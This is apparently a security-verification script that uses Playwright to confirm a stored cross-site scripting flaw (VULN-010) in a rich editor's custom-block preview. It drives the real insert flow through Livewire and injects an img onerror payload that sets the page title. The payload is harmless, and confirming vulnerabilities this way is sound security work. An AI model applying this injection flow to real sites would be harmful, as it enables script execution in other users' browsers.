#!/usr/bin/env python3
"""Runs INSIDE the Playwright container (see lib/browser.py). Confirms VULN-010 end-to-end:
drive the REAL custom-block insert flow (mountAction 'customBlock' → set config.body →
callMountedAction). The server computes base64(toPreviewHtml(config)) with NO Str::sanitizeHtml
and dispatches it to the editor, which injects it via innerHTML — so an onerror payload in the
block's config executes in the browser.

Reads env: BASE_URL, SUFFIX, EVID_DIR. Prints RESULT=PASS/FAIL. Exits 0/1.
"""
import os
import sys
from playwright.sync_api import sync_playwright

BASE = os.environ["BASE_URL"]
SUFFIX = os.environ["SUFFIX"]
EVID = os.environ.get("EVID_DIR", "/work")
EXPECT = f"PWNED-{SUFFIX}"
PAYLOAD = f"<img src=x onerror=\"document.title='{EXPECT}'\">"


def main() -> int:
    with sync_playwright() as p:
        b = p.chromium.launch(args=["--no-sandbox"])
        pg = b.new_page()
        pg.goto(f"{BASE}/forms/fields/rich-editor", wait_until="networkidle")
        pg.wait_for_timeout(1500)

        wire_id = pg.evaluate("""() => {
            for (const el of document.querySelectorAll('[wire\\\\:id]')) {
                const snap = el.getAttribute('wire:snapshot') || '';
                if (snap.includes('richEditorCustomBlocks')) return el.getAttribute('wire:id');
            }
            return null;
        }""")
        print(f"WIRE_ID={wire_id}")

        # Drive the real insert flow through $wire (what the editor's "Raw" block button does).
        pg.evaluate(
            """async ([id, payload]) => {
                const w = window.Livewire.find(id);
                await w.mountAction('customBlock',
                    { id: 'rawhtml', mode: 'insert', editorSelection: { type: 'node', anchor: 0, head: 0 } },
                    { schemaComponent: 'form.richEditorCustomBlocks' });
                w.set('mountedActions.0.data.body', payload, false);
                await w.callMountedAction();
            }""",
            [wire_id, PAYLOAD],
        )
        # wait for the run-rich-editor-commands dispatch → node insert → preview innerHTML → onerror
        fired = False
        for _ in range(8):
            pg.wait_for_timeout(1000)
            if pg.title() == EXPECT:
                fired = True
                break
        title = pg.title()
        print(f"TITLE_AFTER={title}")
        try:
            pg.screenshot(path=f"{EVID}/after_insert.png")
        except Exception:  # noqa: BLE001
            pass
        b.close()

    if fired:
        print("RESULT=PASS (customBlock preview innerHTML executed the config payload)")
        return 0
    print("RESULT=FAIL (payload did not execute)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
